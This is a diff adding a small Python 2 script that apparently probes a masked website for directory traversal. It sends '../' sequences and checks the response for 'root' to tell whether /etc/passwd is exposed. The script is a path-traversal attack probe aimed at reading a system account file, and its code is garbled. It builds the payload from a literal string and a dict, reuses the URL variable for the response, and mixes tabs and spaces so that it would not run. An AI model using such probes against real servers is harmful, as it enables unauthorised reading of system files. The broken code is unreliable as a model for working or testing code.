@@ -1,0 +1,24 @@
+import requests
+import sys
+
+url = "http://www.***.com/"
+
+payloads = {'etc/passwd':'root'}
+up = '../'
+
+for payload,string in payloads.iteritems():
+    for x in range(1,9):
+       try:
+	url = requests.post(url + "x*up"+ payloads)
+        if string in url.text:
+            print "Parameter Vulnerable\r\n"
+            print "Vulnerable url is " +url
+            print "Content of Url is \n" +url.text
+            break
+        else :
+            print "Parameter not vulnerable - "+payload
+       except:
+	    pass
+
+
+
